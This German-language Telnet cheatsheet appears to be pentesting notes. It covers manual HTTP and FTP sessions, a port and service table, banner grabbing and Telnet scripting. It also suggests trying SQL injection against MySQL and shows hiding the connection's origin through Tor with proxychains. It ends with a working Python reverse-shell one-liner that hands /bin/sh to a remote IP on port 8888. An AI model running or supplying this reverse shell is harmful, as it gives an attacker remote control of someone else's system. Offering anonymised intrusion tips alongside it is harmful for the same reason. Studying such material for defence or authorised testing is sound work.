# Telnet

Telnet ist ein Netzwerkprotokoll, das vorwiegend für die Kommunikation mit entfernten Systemen über eine Text-basierte Konsole genutzt wird. In modernen Anwendungen wird es oft verwendet, um mit verschiedenen Diensten und Servern zu interagieren, Fehler zu diagnostizieren oder Dienste zu testen. Dieses Cheatsheet bietet eine Übersicht zu grundlegenden Telnet-Befehlen und Anwendungsfällen, einschließlich der Identifizierung und Interaktion mit verschiedenen Diensten.

***

**1. Grundlegende Telnet-Befehle**

*   **Verbindung zu einem Host herstellen:** Um eine Verbindung zu einem Server auf einem spezifischen Port herzustellen, kann der folgende Befehl verwendet werden:

    ```bash
    telnet <IP-Adresse> <Port>
    ```

    Beispiel:

    ```bash
    telnet 192.168.1.1 80
    ```
* **Verbindung schließen:** Um die Telnet-Sitzung zu beenden, drückt man `Ctrl+]`, um den Telnet-Befehlsprompt zu öffnen, und gibt dann den Befehl `quit` ein.
* **Interaktive Eingabe von Befehlen:** In der Telnet-Sitzung können beliebige Befehle zur Kommunikation mit dem Server eingegeben werden. Dies ist besonders nützlich für manuelle HTTP- oder FTP-Anfragen.

***

**2. Telnet für Webdienste (HTTP)**

Telnet eignet sich gut, um mit HTTP-Servern zu kommunizieren. Hiermit können HTTP-Anfragen manuell gesendet und die Serverantworten analysiert werden.

*   **Beispiel einer HTTP-GET-Anfrage:**

    ```bash
    GET / HTTP/1.1
    Host: <Ziel-Host>
    ```

    Beispiel:

    ```bash
    GET /index.html HTTP/1.1
    Host: example.com
    ```
*   **Beispiel einer HTTP-POST-Anfrage:**

    ```bash
    POST /submit HTTP/1.1
    Host: <Ziel-Host>
    Content-Length: <Länge der Daten>

    <Daten>  # Hier die zu sendenden Daten eingeben
    ```

***

**3. Identifizierung von Diensten über Telnet**

Telnet kann verwendet werden, um verschiedene Dienste, die auf bestimmten Ports laufen, zu identifizieren. Nach der Herstellung einer Verbindung kann der Dienst an der Antwort des Servers erkannt werden.

| **Port** | **Dienst**         | **Beschreibung**                                           |
| -------- | ------------------ | ---------------------------------------------------------- |
| 21       | FTP                | File Transfer Protocol, zum Übertragen von Dateien         |
| 22       | SSH                | Secure Shell, für verschlüsselte Remote-Verbindungen       |
| 23       | Telnet             | Terminalprotokoll für unverschlüsselte Remote-Verbindungen |
| 25       | SMTP               | Simple Mail Transfer Protocol, für E-Mail-Übertragungen    |
| 53       | DNS                | Domain Name System, für Domainnamensauflösungen            |
| 80       | HTTP               | Hypertext Transfer Protocol, Standard für Webseiten        |
| 443      | HTTPS              | HTTP über SSL/TLS für sichere Webseiten                    |
| 3306     | MySQL              | Datenbankdienst für MySQL                                  |
| 8080     | HTTP (Alternative) | Web-Server, oft für Proxy-Dienste oder alternative Ports   |

**Beispiel: Telnet zu einem HTTP-Server**

```bash
telnet example.com 80
```

Dann kann eine HTTP-GET-Anfrage wie folgt eingegeben werden:

```bash
GET / HTTP/1.1
Host: example.com
```

**Beispiel: Telnet zu einem FTP-Server**

```bash
telnet example.com 21
```

Die Antwort könnte etwa so aussehen:

```
220 (vsFTPd 3.0.3) Welcome message
```

Nun kann man typische FTP-Befehle wie `USER`, `PASS` oder `LIST` verwenden, um mit dem Server zu interagieren.

***

**4. Erkennung von Diensten**

Nach der Herstellung einer Telnet-Verbindung kann die Antwort des Servers genutzt werden, um den ausgeführten Dienst zu identifizieren.

* **FTP:** Antwort beginnt typischerweise mit `220`, gefolgt von einer Versionsnummer des FTP-Servers (z.B., `220 (vsFTPd 3.0.3)`).
* **SMTP:** Antwort beginnt oft mit `220` und enthält eine Beschreibung des Mail-Servers.
* **HTTP:** Antwort beginnt mit dem HTTP-Protokoll und einem Statuscode, z.B., `HTTP/1.1 200 OK`.
* **MySQL:** Antwort beginnt mit einer Versionsnummer von MySQL, z.B., `5.7.32-log MySQL Community Server`.
* **SSH:** Antwort beginnt mit `SSH-2.0` gefolgt von einer Versionsnummer, z.B., `SSH-2.0-OpenSSH_7.4p1`.

***

**5. Nutzung von Telnet für Interaktive Shells**

Telnet kann verwendet werden, um mit Diensten zu interagieren, die eine **interaktive Shell** anbieten. Beispielsweise kann über Telnet auf einen MySQL-Server zugegriffen werden.

**Beispiel: Telnet zu einem MySQL-Server**

```bash
telnet example.com 3306
```

Die Antwort könnte eine MySQL-Version angeben:

```
5.7.32-log MySQL Community Server (GPL)
```

Hier könnte man versuchen, SQL-Befehle oder Schwachstellen wie SQL-Injection zu nutzen, um weitere Informationen zu erlangen.

***

**6. Sicherheitsüberlegungen**

Telnet überträgt alle Daten, einschließlich Passwörtern, unverschlüsselt. Daher sollte Telnet nur in sicheren, vertrauenswürdigen Netzwerken verwendet werden. Wenn Anonymität oder Verschlüsselung erforderlich sind, sollte man auf sicherere Alternativen wie **SSH** oder **Tor** zurückgreifen.

*   **Anonymität mit Tor:** Es ist möglich, Telnet-Verbindungen über das Tor-Netzwerk zu tunneln, um die Herkunft der Anfrage zu verbergen. Dies kann durch den Einsatz von Tools wie **proxychains** erreicht werden:

    ```bash
    proxychains telnet example.com 80
    ```

***

**7. Telnet-Skripting**

Telnet kann auch automatisiert werden, um wiederholte Interaktionen zu erleichtern. Ein einfaches Bash-Skript könnte verwendet werden, um HTTP-Anfragen über Telnet zu senden.

Beispiel eines Bash-Skripts:

```bash
#!/bin/bash
telnet example.com 80 <<EOF
GET / HTTP/1.1
Host: example.com
EOF
```

***

### Oneline Reverse-Shells

#### Python

`import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.115.149", 8888)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call(["/bin/sh", "-i"])`
